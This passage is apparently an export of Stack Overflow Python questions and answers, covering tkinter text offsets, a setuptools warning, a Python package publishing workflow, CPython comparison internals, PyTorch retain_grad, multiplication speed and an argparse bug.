<li><code>text.delete(1.1, 1.3)</code>: This act on the same line, because I was trying to see if it would delete 3 chars in any direction on the same line. It delete 2 chars instead of 3, and it does so by omitting one char at the start of the first line, and delete 2 char <em>after</em> that.</li>
<li><code>text.delete(&quot;end - 9c&quot;)</code>: only work at the end (last line), and omit 7 chars starting from EOF, and then delete a single char after that.</li>
<li><code>text.delete(0.1, 0.2)</code>: Does not do anything. Same result for other <code>0.X, 0.X</code> combination.</li>
</ul>
<p>Example of what I try to achieve:</p>
<p>Using the example text above would take too long, so let's consider a smaller string, say &quot;hello world&quot;.
Now let's say we use an index that start with 1 (doesn't matter but make things easier to explain), the first char is &quot;h&quot; and the last one is &quot;d&quot;. So say I use chars range such as &quot;2-7&quot;, that would be &quot;ello w&quot;. Say I want to do &quot;1-8&quot;? -&gt; &quot;hello wo&quot;, and now starting from the end, &quot;11-2&quot;, &quot;ello world&quot;.</p>
<p>This is basically similar to what <a href=""https://docs.python.org/3/tutorial/inputoutput.html"" rel=""noreferrer"">f.tell() and f.seek() do</a>. I want to do something like that but using only the content <em>inside</em> of the text widget, and then do something on those bytes/chars ranges (in the example above, I'm deleting them, etc).</p>
","74461805","<p>Based on my own relentless testing and other answers here, I managed to get to a solution.</p>
<pre class=""lang-py prettyprint-override""><code>import tkinter as tk
from tkinter import messagebox  # https://stackoverflow.com/a/29780454/12349101

root = tk.Tk()

main_text = tk.Text(root)

box_text = tk.Text(root, height=1, width=10)
box_text.pack()

txt = &quot;&quot;&quot;hello world&quot;&quot;&quot;

len_txt = len(
    txt)  # get the total length of the text content. Can be replaced by `os.path.getsize` or other alternatives for files

main_text.insert(tk.INSERT, txt)


def offset():
    inputValue = box_text.get(&quot;1.0&quot;,
                              &quot;end-1c&quot;)  # get the input of the text widget without newline (since it's added by default)

    # focusing the other text widget, deleting and re-insert the original text so that the selection/tag is updated (no need to move the mouse to the other widget in this example)
    main_text.focus()
    main_text.delete(&quot;1.0&quot;, tk.END)
    main_text.insert(tk.INSERT, txt)


    to_do = inputValue.split(&quot;-&quot;)

    if len(to_do) == 1:  # if length is 1, it probably is a single offset for a single byte/char
        to_do.append(to_do[0])

    if not to_do[0].isdigit() or not to_do[1].isdigit():  # Only integers are supported
        messagebox.showerror(&quot;error&quot;, &quot;Only integers are supported&quot;)
        return  # trick to prevent the failing range to be executed

    if int(to_do[0]) &gt; len_txt or int(to_do[1]) &gt; len_txt:  # total length is the maximum range
        messagebox.showerror(&quot;error&quot;,
                             &quot;One of the integers in the range seems to be bigger than the total length&quot;)
        return  # trick to prevent the failing range to be executed

    if to_do[0] == &quot;0&quot; or to_do[1] == &quot;0&quot;:  # since we don't use a 0 index, this isn't needed
        messagebox.showerror(&quot;error&quot;, &quot;Using zero in this range isn't useful&quot;)
        return  # trick to prevent the failing range to be executed

    if int(to_do[0]) &gt; int(to_do[1]):  # This is to support reverse range offset, so 11-2 -&gt; 2-11, etc
        first = int(to_do[1]) - 1
        first = str(first).split(&quot;-&quot;)[-1:][0]

        second = (int(to_do[0]) - len_txt) - 1
        second = str(second).split(&quot;-&quot;)[-1:][0]
    else:  # use the offset range normally
        first = int(to_do[0]) - 1
        first = str(first).split(&quot;-&quot;)[-1:][0]

        second = (int(to_do[1]) - len_txt) - 1
        second = str(second).split(&quot;-&quot;)[-1:][0]

    print(first, second)
    main_text.tag_add(&quot;sel&quot;, '1.0 + {}c'.format(first), 'end - {}c'.format(second))


buttonCommit = tk.Button(root, text=&quot;use offset&quot;,
                         command=offset)
buttonCommit.pack()
main_text.pack(fill=&quot;both&quot;, expand=1)
main_text.pack_propagate(0)
root.mainloop()
</code></pre>
<p>Now the above works, as described in the &quot;hello world&quot; example in my post. It isn't a 1:1 clone/emulation of f.tell() or f.seek(), but I feel like it's close.</p>
<p>The above does not use <code>text.delete</code> but instead select the text, so it's visually less confusing (at least to me).</p>
<p>It works with the following offset type:</p>
<ul>
<li>reverse range: <code>11-2</code> -&gt; <code>2-11</code> so the order does not matter</li>
<li>normal range: <code>2-11</code>, <code>1-8</code>, <code>8-10</code>...</li>
<li>single offset: <code>10</code> or <code>10-10</code> so it can support single char/byte</li>
</ul>
<p>Now the main thing I noticed, is that <code>'1.0 + {}c', 'end - {}c'</code> where <code>{}</code> is the range, works by omitting its given range.</p>
<p>If you were to use <code>1-3</code> as a range on the string <code>hello world</code> it would select <code>ello wor</code>. You could say it omitted <code>h</code> and <code>ld\n</code>, with the added newline by Tkinter (which we ignore in the code above unless it's part of the total length variable). The correct offset (or at least the one following the example I gave in the post above) would be <code>2-9</code>.</p>
<p>P.S: For this example, clicking on the button after entering the offsets range is needed.</p>
"
"73257839","1","'setup.py install is deprecated' warning shows up every time I open a terminal in VSCode","<p>Every time I boot up terminal on VSCode, I get the following prompt. This does not happen on Terminal.app.</p>
<pre><code>    /usr/local/lib/python3.9/site-packages/setuptools/command/install.py:34:
SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip
and other standards-based tools.
</code></pre>
<p>How do I resolve this?</p>
","73273307","<p>Install the <strong>setuptools 58.2.0</strong> version using the following command</p>
<pre><code>pip install setuptools==58.2.0
</code></pre>
"
"73157383","1","How do you create a fully-fledged Python package?","<p>When creating a Python package, you can simply write the code, build the package, and share it on PyPI. But how do you do that?</p>
<ol>
<li>How do you create a Python package?</li>
<li>How do you publish it?</li>
</ol>
<p>And then, what if you want to go further?</p>
<ol start=""3"">
<li>How do you set up CI/CD for it?</li>
<li>How do you test it and check code coverage?</li>
<li>How do you lint it?</li>
<li>How do you automate everything you can?</li>
</ol>
","73157490","<h1>Preamble</h1>
<p>When you've published dozens of packages, you know how to answer these questions in ways that suit your workflow(s) and taste. But answering these questions for the first time can be quite difficult, time consuming, and frustrating!</p>
<p>That's why I spent days researching ways of doing these things, which I then published as a blog article called <a href=""https://mathspp.com/blog/how-to-create-a-python-package-in-2022"" rel=""noreferrer"">How to create a Python package in 2022</a>.</p>
<p>That article, and this answer, document my findings for when I wanted to publish my package <a href=""https://github.com/mathspp/extendedjson"" rel=""noreferrer"">extendedjson</a></p>
<h1>Overview</h1>
<p>Here is an overview of some tools you can use and the steps you can take, in the order I followed them while discovering all of this.</p>
<p>Disclaimer: other alternative tools exist (usually) &amp; most of the steps here are not mandatory.</p>
<ul>
<li>Use <a href=""https://python-poetry.org/"" rel=""noreferrer"">Poetry</a> for dependency management</li>
<li>Use <a href=""https://github.com/"" rel=""noreferrer"">GitHub</a> to host the code</li>
<li>Use <a href=""https://pre-commit.com/"" rel=""noreferrer"">pre-commit</a> to ensure committed code is linted &amp; formatted well</li>
<li>Use <a href=""https://test.pypi.org/"" rel=""noreferrer"">Test PyPI</a> to test uploading your package (which will make it installable with <code>pip</code>)</li>
<li>Use <a href=""https://scriv.readthedocs.io/en/latest/"" rel=""noreferrer"">Scriv</a> for changelog management</li>
<li>Upload to the real <a href=""https://pypi.org"" rel=""noreferrer"">PyPI</a></li>
<li>Use <a href=""https://docs.pytest.org/en/"" rel=""noreferrer"">pytest</a> to test your Python code</li>
<li>Use <a href=""https://tox.wiki/en/latest/"" rel=""noreferrer"">tox</a> to automate linting, formatting, and testing across Python versions
<ul>
<li><a href=""https://github.com/psf/black"" rel=""noreferrer"">black</a></li>
<li><a href=""https://pycqa.github.io/isort/"" rel=""noreferrer"">isort</a></li>
<li><a href=""https://pylint.pycqa.org/en/latest/"" rel=""noreferrer"">pylint</a></li>
<li><a href=""https://flake8.pycqa.org/en/latest/"" rel=""noreferrer"">flake8</a> with <a href=""https://github.com/PyCQA/mccabe"" rel=""noreferrer"">mccabe</a></li>
</ul>
</li>
<li>Add code coverage with <a href=""https://coverage.readthedocs.io/"" rel=""noreferrer"">coverage.py</a></li>
<li>Set up CI/CD with GitHub Actions
<ul>
<li>run linters and tests</li>
<li>trigger automatically on pull requests and commits</li>
<li>integrate with <a href=""https://about.codecov.io/"" rel=""noreferrer"">Codecov</a> for coverage reports</li>
<li>publish to PyPI automatically</li>
</ul>
</li>
<li>Add cool README badges</li>
<li>Tidy up a bit
<ul>
<li>set tox to use pre-commit</li>
<li>remove duplicate work between tox and pre-commit hooks</li>
<li>remove some redundancy in CI/CD</li>
</ul>
</li>
</ul>
<h1>Steps</h1>
<p>Here is an overview of the things you can do and more or less how to do it. Again, thorough instructions plus the rationale of why I picked certain tools, methods, etc, can be found in <a href=""https://mathspp.com/blog/how-to-create-a-python-package-in-2022"" rel=""noreferrer"">the reference article</a>.</p>
<ul>
<li><p>Use <a href=""https://python-poetry.org/"" rel=""noreferrer"">Poetry</a> for dependency management.</p>
<ul>
<li><code>poetry init</code> initialises a project in a directory or <code>poetry new dirname</code> creates a new directory structure for you</li>
<li>do <code>poetry install</code> to install all your dependencies</li>
<li><code>poetry add packagename</code> can be used to add <code>packagename</code> as a dependency, use <code>-D</code> if it's a development dependency (i.e., you need it while developing the package, but the package users won't need it. For example, <code>black</code> is a nice example of a development dependency)</li>
</ul>
</li>
<li><p>Set up a repository on <a href=""https://github.com/"" rel=""noreferrer"">GitHub</a> to host your code.</p>
</li>
<li><p>Set up pre-commit hooks to ensure your code is always properly formatted and it passes linting. This goes on <code>.pre-commit-config.yaml</code>. E.g., the YAML below checks TOML and YAML files, ensures all files end with a newline, makes sure the end-of-line marker is consistent across all files, and then runs <a href=""https://github.com/psf/black"" rel=""noreferrer"">black</a> and <a href=""https://pycqa.github.io/isort/"" rel=""noreferrer"">isort</a> on your code.</p>
</li>
</ul>
<pre class=""lang-yaml prettyprint-override""><code># See https://pre-commit.com for more information
# See https://pre-commit.com/hooks.html for more hooks
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.0.1
    hooks:
      - id: check-toml
      - id: check-yaml
      - id: end-of-file-fixer
      - id: mixed-line-ending
  - repo: https://github.com/psf/black
    rev: 22.3.0
    hooks:
      - id: black
  - repo: https://github.com/PyCQA/isort
    rev: 5.10.1
    hooks:
      - id: isort
        args: [&quot;--profile&quot;, &quot;black&quot;]
</code></pre>
<ul>
<li><p>Configure <a href=""https://python-poetry.org/"" rel=""noreferrer"">Poetry</a> to use the <a href=""https://test.pypi.org/"" rel=""noreferrer"">Test PyPI</a> to make sure you can publish a package and it is downloadable &amp; installable.</p>
<ul>
<li>Tell <a href=""https://python-poetry.org/"" rel=""noreferrer"">Poetry</a> about Test PyPI with <code>poetry config repositories.testpypi https://test.pypi.org/legacy/</code></li>
<li>Log in to Test PyPI, get an API token, and tell Poetry to use it with <code>poetry config http-basic.testpypi __token__ pypi-your-api-token-here</code> (the <code>__token__</code> is a literal and shouldn't be replaced, your token goes after that).</li>
<li>Build <code>poetry build</code> and upload your package <code>poetry publish -r testpypi</code></li>
</ul>
</li>
<li><p>Manage your CHANGELOG with <a href=""https://scriv.readthedocs.io/en/latest/"" rel=""noreferrer"">Scriv</a></p>
<ul>
<li>run <code>scriv create</code> before any substantial commit and edit the file that pops up</li>
<li>run <code>scriv collect</code> before any release to collect all fragments into one changelog</li>
</ul>
</li>
<li><p>Configure Poetry to use <a href=""https://pypi.org"" rel=""noreferrer"">PyPI</a></p>
<ul>
<li>login to PyPI and get an API token</li>
<li>tell Poetry about it with <code>poetry config pypi-token.pypi pypi-your-token-here</code></li>
<li>build &amp; publish your package in one fell swoop with <code>poetry publish --build</code></li>
</ul>
</li>
<li><p>Do a victory lap: try <code>pip install yourpackagename</code> to make sure everything is going great ;)</p>
</li>
<li><p>Publish a GH release that matches what you uploaded to PyPI</p>
</li>
<li><p>Write tests. There are <em>many</em> options out there. <a href=""https://docs.pytest.org/en/"" rel=""noreferrer"">Pytest</a> is simple, versatile, and not too verbose.</p>
<ul>
<li>write tests in a directory <code>tests/</code></li>
<li>start test files with <code>test_...</code></li>
<li>actual tests are functions with a name starting with <code>test_...</code></li>
<li>use assertions (<code>assert</code>) to check for things (tests fail when asserting something Falsy); notice sometimes you don't even need to import <code>pytest</code> in your test files; e.g.:</li>
</ul>
</li>
</ul>
<pre class=""lang-py prettyprint-override""><code># In tests/test_basic_example.py

def this_test_would_definitely_fail():
    assert 5 &gt; 10

def this_test_would_definitely_pass():
    assert 5 &gt; 0
</code></pre>
<ul>
<li><p>run tests with the command <code>pytest</code></p>
</li>
<li><p>Automate testing, linting, and formatting, with <a href=""https://tox.wiki/en/latest/"" rel=""noreferrer"">tox</a>.</p>
<ul>
<li>tox creates virtual environments for separate Python versions and can run essentially what you tell it to. Configuration goes in <code>tox.ini</code>. You can also embed it in the file <code>pyproject.toml</code>, but as of writing this, that's only supported if you add a string that actually represents the <code>.ini</code> configuration, which is ugly. Example <code>tox.ini</code>:</li>
</ul>
</li>
</ul>
<pre class=""lang-ini prettyprint-override""><code>[tox]
isolated_build = True
envlist = py38,py39,py310

[testenv]
deps =
    black
    pytest
commands =
    black --check extendedjson
    pytest .
</code></pre>
<p>The environments <code>py38</code> to <code>py310</code> are automatically understood by <a href=""https://tox.wiki/en/latest/"" rel=""noreferrer"">tox</a> to represent different Python versions (you guess which ones). The header <code>[testenv]</code> defines configurations for all those environments that <a href=""https://tox.wiki/en/latest/"" rel=""noreferrer"">tox</a> knows about. We install the dependencies listed in <code>deps = ...</code> and then run the commands listed in <code>commands = ...</code>.</p>
<ul>
<li><p>run tox with <code>tox</code> for all environments or <code>tox -e py39</code> to pick a specific environment</p>
</li>
<li><p>Add code coverage with <a href=""https://coverage.readthedocs.io/en/6.4.2/"" rel=""noreferrer"">coverage.py</a></p>
<ul>
<li>run tests and check coverage with <code>coverage run --source=yourpackage --branch -m pytest .</code></li>
<li>create a nice HTML report with <code>coverage html</code></li>
<li>add this to tox</li>
</ul>
</li>
<li><p>Create a GitHub action that runs linting and testing on commits and pull requests</p>
<ul>
<li>GH Actions are just YAML files in <code>.github/workflows</code></li>
<li>this example GH action runs tox on multiple Python versions</li>
</ul>
</li>
</ul>
<pre class=""lang-yaml prettyprint-override""><code># .github/workflows/build.yaml
name: Your amazing CI name

# Run automatically on...
on:
  push:  # pushes...
    branches: [ main ]  # to the main branch... and
  pull_request:  # on pull requests...
    branches: [ main ]  # against the main branch.

# What jobs does this workflow run?
jobs:
  build:  # There's a job called “build” which
    runs-on: ubuntu-latest  # runs on an Ubuntu machine
    strategy:
      matrix:  # that goes through
        python-version: [&quot;3.8&quot;, &quot;3.9&quot;, &quot;3.10&quot;]  # these Python versions.

    steps:  # The job “build” has multiple steps:
      - name: Checkout sources
        uses: actions/checkout@v2  # Checkout the repository into the runner,

      - name: Setup Python
        uses: actions/setup-python@v2  # then set up Python,
        with:
          python-version: ${{ matrix.python-version }}  # with the version that is currently “selected”...

      - name: Install dependencies
        run: |  # Then run these commands
          python -m pip install --upgrade pip
          python -m pip install tox tox-gh-actions  # install two dependencies...

      - name: Run tox
        run: tox  # and finally run tox.
</code></pre>
<p>Notice that, above, we installed tox <strong>and</strong> a plugin called <code>tox-gh-actions</code>.
This plugin will make tox aware of the Python version that is set up in the GH action runner, which will allow us to specify which environments tox will run in that case.
We just need to set a correspondence in the file <code>tox.ini</code>:</p>
<pre class=""lang-ini prettyprint-override""><code># tox.ini
# ...
[gh-actions]
python =
    3.8: py38
    3.9: py39
    3.10: py310
</code></pre>
<ul>
<li>Integrate with <a href=""https://about.codecov.io/"" rel=""noreferrer"">Codecov</a> for nice coverage reports in the pull requests.
<ul>
<li>log in to Codecov with GitHub and give permissions</li>
<li>add Codecov's action to the YAML from before <strong>after</strong> tox runs (it's tox that generates the local coverage report data) and add/change a coverage command to generate an <code>xml</code> report (it's a format that Codecov understands)</li>
</ul>
</li>
</ul>
<pre class=""lang-yaml prettyprint-override""><code># ...
      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v2
        with:
            fail_ci_if_error: true
</code></pre>
<ul>
<li>Add a GH Action to publish to PyPI automatically
<ul>
<li>just set up a YAML file that does your manual steps of building and publishing with Poetry <strong>when</strong> a new release is made</li>
<li>create a PyPI token to be used by GitHub</li>
<li>add it as a secret in your repository</li>
<li>configure Poetry in the action to use that secret</li>
</ul>
</li>
</ul>
<pre class=""lang-yaml prettyprint-override""><code>name: Publish to PyPI

on:
  release:
    types: [ published ]
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-and-publish:
    runs-on: ubuntu-latest

    steps:
      # Checkout and set up Python

      - name: Install poetry and dependencies
        run: |
          python -m pip install --upgrade pip
          python -m pip install poetry

      - name: Configure poetry
        env:
          pypi_token: ${{ secrets.PyPI_TOKEN }}  # You set this manually as a secret in your repository
        run: poetry config pypi-token.pypi $pypi_token

      - name: Build and publish
        run: poetry publish --build
</code></pre>
<ul>
<li><p>Add cool badges to your README file like
<a href=""https://pypi.org/project/extendedjson/"" rel=""noreferrer""><img src=""https://img.shields.io/pypi/v/extendedjson"" alt=""PyPI version"" /></a>
<a href=""https://github.com/mathspp/extendedjson/actions/workflows/build.yaml"" rel=""noreferrer""><img src=""https://github.com/mathspp/extendedjson/actions/workflows/build.yaml/badge.svg"" alt=""Build status"" /></a>
<a href=""https://codecov.io/gh/mathspp/extendedjson/"" rel=""noreferrer""><img src=""https://codecov.io/gh/mathspp/extendedjson/branch/main/graph/badge.svg"" alt=""Code coverage"" /></a>
<a href=""https://github.com/mathspp/extendedjson"" rel=""noreferrer""><img src=""https://img.shields.io/github/stars/mathspp/extendedjson"" alt=""GitHub stars"" /></a>
<a href=""https://pypi.org/project/extendedjson/"" rel=""noreferrer""><img src=""https://img.shields.io/pypi/pyversions/extendedjson"" alt=""Support Python versions"" /></a></p>
</li>
<li><p>Tidy up a bit</p>
<ul>
<li>run linting through tox on pre-commit to deduplicate effort and run your preferred versions of the linters/formatters/...</li>
<li>separate linting/formatting from testing in tox as a separate environment</li>
<li>check coverage only once as a separate tox environment</li>
</ul>
</li>
</ul>
"
"74743233","1","What happens ""behind the scenes"" if I call `None == x` in Python?","<p>I am learning and playing around with Python and I came up with the following test code (please be aware that <em>I would not write productive code like that</em>, but when learning new languages I like to play around with the language's corner cases):</p>
<pre><code>a = None    
print(None == a) # I expected True, I got True

b = 1
print(None == b) # I expected False, I got False

class MyNone:
    # Called if I compare some myMyNone == somethingElse
    def __eq__(self, __o: object) -&gt; bool:
        return True

c = MyNone()
print (None == c) # !!! I expected False, I got True !!!
</code></pre>
<p><strong>Please see the very last line of the code example.</strong></p>
<p>How can it be that <code>None == something</code>, where something is clearly not <code>None</code>, return <code>True</code>? I would have expected that result for <code>something == None</code>, but not for <code>None == something</code>.</p>
<p>I expected that it would call <code>None is something</code> behind the scenes.</p>
<p>So I think the question boils down to: <strong>How does the <code>__eq__</code> method of the <code>None</code> singleton object look like and how could I have found that out?</strong></p>
<hr />
<p>PS: I am aware of <a href=""https://peps.python.org/pep-0008/"" rel=""nofollow noreferrer"">PEP-0008</a> and its quote</p>
<blockquote>
<p>Comparisons to singletons like None should always be done with is or is not, never the equality operators.</p>
</blockquote>
<p>but I <em>still</em> would like to know why <code>print (None == c)</code> in the above example returns <code>True</code>.</p>
","74743523","<p>In fact, <code>None</code>'s type does not have its own <code>__eq__</code> method; within Python we can see that it apparently inherits from the base class <code>object</code>:</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; type(None).__eq__
&lt;slot wrapper '__eq__' of 'object' objects&gt;
</code></pre>
<p>But this is not really what's going on in the source code. The implementation of <code>None</code> can be found in <a href=""https://github.com/python/cpython/blob/74d5f61ebd1cb14907bf7dae1ad9c1e676707bc5/Objects/object.c#L1681"" rel=""noreferrer""><code>Objects/object.c</code></a> in the CPython source, where we see:</p>
<pre class=""lang-c prettyprint-override""><code>PyTypeObject _PyNone_Type = {
    PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)
    &quot;NoneType&quot;,
    0,
    0,
    none_dealloc,       /*tp_dealloc*/ /*never called*/
    0,                  /*tp_vectorcall_offset*/
    0,                  /*tp_getattr*/
    0,                  /*tp_setattr*/
    // ...
    0,                  /*tp_richcompare */
    // ...
    0,                  /*tp_init */
    0,                  /*tp_alloc */
    none_new,           /*tp_new */
};
</code></pre>
<p>I omitted most of the irrelevant parts. The important thing here is that <code>_PyNone_Type</code>'s <code>tp_richcompare</code> is <code>0</code>, i.e. a null pointer. This is checked for in the <a href=""https://github.com/python/cpython/blob/74d5f61ebd1cb14907bf7dae1ad9c1e676707bc5/Objects/object.c#L643"" rel=""noreferrer""><code>do_richcompare</code></a> function:</p>
<pre class=""lang-c prettyprint-override""><code>    if ((f = Py_TYPE(v)-&gt;tp_richcompare) != NULL) {
        res = (*f)(v, w, op);
        if (res != Py_NotImplemented)
            return res;
        Py_DECREF(res);
    }
    if (!checked_reverse_op &amp;&amp; (f = Py_TYPE(w)-&gt;tp_richcompare) != NULL) {
        res = (*f)(w, v, _Py_SwappedOp[op]);
        if (res != Py_NotImplemented)
            return res;
        Py_DECREF(res);
    }
</code></pre>
<p>Translating for those who don't speak C:</p>
<ul>
<li>If the left-hand-side's <code>tp_richcompare</code> function is not null, call it, and if its result is not <code>NotImplemented</code> then return that result.</li>
<li>Otherwise if the reverse hasn't already been checked*, and the right-hand-side's <code>tp_richcompare</code> function is not null, call it, and if the result is not <code>NotImplemented</code> then return that result.</li>
</ul>
<p>There are some other branches in the code, to fall back to in case none of those branches returns a result. But these two branches are enough to see what's going on. It's not that <code>type(None).__eq__</code> returns <code>NotImplemented</code>, rather the type doesn't have the corresponding function in the C source code at all. That means the second branch is taken, hence the result you observe.</p>
<p><sub>*The flag <code>checked_reverse_op</code> is set if the reverse direction has already been checked; this happens if the right-hand-side is a strict subtype of the left-hand-side, in which case it takes priority. That doesn't apply in this case since there is no subtype relation between <code>type(None)</code> and your class.</sub></p>
"
"73698041","1","How retain_grad() in pytorch works? I found its position changes the grad result","<p>in a simple test in pytorch, I want to see grad in a non-leaf tensor, so I use retain_grad():</p>
<pre><code>import torch
a = torch.tensor([1.], requires_grad=True)
y = torch.zeros((10))
gt = torch.zeros((10))

y[0] = a
y[1] = y[0] * 2
y.retain_grad()

loss = torch.sum((y-gt) ** 2)
loss.backward()
print(y.grad)
</code></pre>
<p>it gives me a normal output:</p>
<pre><code>tensor([2., 4., 0., 0., 0., 0., 0., 0., 0., 0.])
</code></pre>
<p>but when I use retain grad() before y[1] and after y[0] is assigned:</p>
<pre><code>import torch
a = torch.tensor([1.], requires_grad=True)
y = torch.zeros((10))
gt = torch.zeros((10))

y[0] = a
y.retain_grad()
y[1] = y[0] * 2

loss = torch.sum((y-gt) ** 2)
loss.backward()
print(y.grad)
</code></pre>
<p>now the output changes to:</p>
<pre><code>tensor([10.,  0.,  0.,  0.,  0.,  0.,  0.,  0.,  0.,  0.])
</code></pre>
<p>I can't understand the result at all.</p>
","73701220","<p>Okay so what's going on is really weird.</p>
<p>What <code>.retain_grad()</code> essentially does is convert any non-leaf tensor into a leaf tensor, such that it contains a <code>.grad</code> attribute (since by default, pytorch computes gradients to leaf tensors only).</p>
<p>Hence, in your first example, after calling <code>y.retain_grad()</code>, it basically converted <code>y</code> into a leaf tensor with an accessible <code>.grad</code> attribute.</p>
<p>However, in your second example, you initially converted the entire <code>y</code> tensor into a leaf tensor; <strong>then</strong>, you created a non-leaf tensor <code>(y[1])</code> <strong>within</strong> your leaf tensor <code>(y)</code>, which is what caused the confusion.</p>
<pre><code>y = torch.zeros((10))  # y is a non-leaf tensor

y[0] = a  # y[0] is a non-leaf tensor
y.retain_grad()  # y is a leaf tensor (including y[1])
y[1] = y[0] * 2  # y[1] is a non-leaf tensor, BUT y[0], y[2], y[3], ..., y[9] are all leaf tensors!
</code></pre>
<p>The confusing part is:</p>
<p><code>y[1]</code> <strong>after</strong> calling <code>y.retain_grad()</code> <strong>is</strong> now a leaf tensor with a <code>.grad</code> attribute. However, <code>y[1]</code> <strong>after</strong> the computation <code>(y[1] = y[0] * 2)</code> is now <strong>not</strong> a leaf tensor with a <code>.grad</code> attribute; it is now treated as a new non-leaf variable/tensor.</p>
<p>Therefore, when calling <code>loss.backward()</code>, the Chain rule of the <code>loss</code> w.r.t <code>y</code>, and particularly looking at the Chain rule of the <code>loss</code> w.r.t leaf <code>y[1]</code> now looks something like this:</p>
<hr />
<p><a href=""https://i.stack.imgur.com/uvCQo.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/uvCQo.png"" alt=""Chain rule"" /></a></p>
"
"73326570","1","Why is the float * int multiplication faster than int * float in CPython?","<p>Basically, the expression <code>0.4 * a</code> is consistently, and surprisingly, significantly faster than <code>a * 0.4</code>. <code>a</code> being an integer. And I have no idea why.</p>
<p>I speculated that it is a case of a <code>LOAD_CONST LOAD_FAST</code> bytecode pair being &quot;more specialized&quot; than the <code>LOAD_FAST LOAD_CONST</code> and I would be entirely satisfied with this explanation, except that this quirk seems to apply only to multiplications where types of multiplied variables differ. (By the way, I can no longer find the link to this &quot;bytecode instruction pair popularity ranking&quot; I once found on github, does anyone have a link?)</p>
<p>Anyway, here are the micro benchmarks:</p>
<pre class=""lang-bash prettyprint-override""><code>$ python3.10 -m pyperf timeit -s&quot;a = 9&quot; &quot;a * 0.4&quot;
Mean +- std dev: 34.2 ns +- 0.2 ns
</code></pre>
<pre class=""lang-bash prettyprint-override""><code>$ python3.10 -m pyperf timeit -s&quot;a = 9&quot; &quot;0.4 * a&quot;
Mean +- std dev: 30.8 ns +- 0.1 ns
</code></pre>
<pre class=""lang-bash prettyprint-override""><code>$ python3.10 -m pyperf timeit -s&quot;a = 0.4&quot; &quot;a * 9&quot;
Mean +- std dev: 30.3 ns +- 0.3 ns
</code></pre>
<pre class=""lang-bash prettyprint-override""><code>$ python3.10 -m pyperf timeit -s&quot;a = 0.4&quot; &quot;9 * a&quot;
Mean +- std dev: 33.6 ns +- 0.3 ns
</code></pre>
<p>As you can see - in the runs where the float comes first (2nd and 3rd) - it is faster.<br>
So my question is where does this behavior come from? I'm 90% sure that it is an implementation detail of CPython, but I'm not that familiar with low level instructions to state that for sure.</p>
","73326827","<p>It's CPython's implementation of the <code>BINARY_MULTIPLY</code> opcode. It has no idea what the types are at compile-time, so everything has to be figured out at run-time. Regardless of what <code>a</code> and <code>b</code> may be, <code>BINARY_MULTIPLY</code> ends up inoking <code>a.__mul__(b)</code>.</p>
<p>When <code>a</code> is of int type <code>int.__mul__(a, b)</code> has no idea what to do unless <code>b</code> is also of int type. It returns <code>Py_RETURN_NOTIMPLEMENTED</code> (an internal C constant). This is in <code>longobject.c</code>'s <code>CHECK_BINOP</code> macro. The interpreter sess that, and effectively says &quot;OK, <code>a.__mul__</code> has no idea what to do, so let's give <code>b.__rmul__</code> a shot at it&quot;. None of that is free - it all takes time.</p>
<p><code>float.__mul__(b, a)</code> (same as <code>float.__rmul__</code>) does know what to do with an int (converts it to float first), so that succeeds.</p>
<p>But when <code>a</code> is of float type to begin with, we go to <code>float.__mul__</code> first, and that's the end of it. No time burned figuring out that the int type doesn't know what to do.</p>
<p>The actual code is quite a bit more involved than the above pretends, but that's the gist of it.</p>
"
"73353608","1","Why does argparse not accept ""--"" as argument?","<p>My script takes <code>-d</code>, <code>--delimiter</code> as argument:</p>
<pre><code>parser.add_argument('-d', '--delimiter')
</code></pre>
<p>but when I pass it <code>--</code> as delimiter, it is empty</p>
<pre><code>script.py --delimiter='--' 
</code></pre>
<p>I know <code>--</code> is special in argument/parameter parsing, but I am using it in the form <code>--option='--'</code> and quoted.</p>
<p>Why does it not work?
I am using Python 3.7.3</p>
<p>Here is test code:</p>
<pre><code>#!/bin/python3

import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--delimiter')
parser.add_argument('pattern')

args = parser.parse_args()

print(args.delimiter)
</code></pre>
<p>When I run it as <code>script --delimiter=-- AAA</code> it prints empty <code>args.delimiter</code>.</p>
","73354266","<p>This looks like a bug. You should report it.</p>
<p><a href=""https://github.com/python/cpython/blob/3.10/Lib/argparse.py#L2422-L2426"" rel=""noreferrer"">This code</a> in <code>argparse.py</code> is the start of <code>_get_values</code>, one of the primary helper functions for parsing values:</p>
<pre><code>if action.nargs not in [PARSER, REMAINDER]:
    try:
        arg_strings.remove('--')
    except ValueError:
        pass
</code></pre>
<p>The code receives the <code>--</code> argument as the single element of a list <code>['--']</code>. It tries to remove <code>'--'</code> from the list, because when using <code>--</code> as an end-of-options marker, the <code>'--'</code> string will end up in <code>arg_strings</code> for one of the <code>_get_values</code> calls. However, when <code>'--'</code> is the actual argument value, the code still removes it anyway, so <code>arg_strings</code> ends up being an empty list instead of a single-element list.</p>
<p>The code then goes through an else-if chain for handling different kinds of argument (branch bodies omitted to save space here):</p>
<pre><code># optional argument produces a default when not present
if not arg_strings and action.nargs == OPTIONAL:
    ...
# when nargs='*' on a positional, if there were no command-line
# args, use the default if it is anything other than None
elif (not arg_strings and action.nargs == ZERO_OR_MORE and
      not action.option_strings):
    ...
# single argument or optional argument produces a single value
elif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:
    ...
# REMAINDER arguments convert all values, checking none
elif action.nargs == REMAINDER:
    ...
# PARSER arguments convert all values, but check only the first
elif action.nargs == PARSER:
    ...
# SUPPRESS argument does not put anything in the namespace
elif action.nargs == SUPPRESS:
    ...
# all other types of nargs produce a list
else:
    ...
</code></pre>
<p>This code should go through the 3rd branch,</p>
<pre><code># single argument or optional argument produces a single value
elif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:
</code></pre>
<p>but because the argument is missing from <code>arg_strings</code>, <code>len(arg_strings)</code> is 0. It instead hits the final case, which is supposed to handle a completely different kind of argument. That branch ends up returning an empty list instead of the <code>'--'</code> string that should have been returned, which is why <code>args.delimiter</code> ends up being an empty list instead of a <code>'--'</code> string.</p>
<hr />
<p>This bug manifests with positional arguments too. For example,</p>
<pre><code>import argparse

parser = argparse.ArgumentParser()
parser.add_argument('a')
parser.add_argument('b')

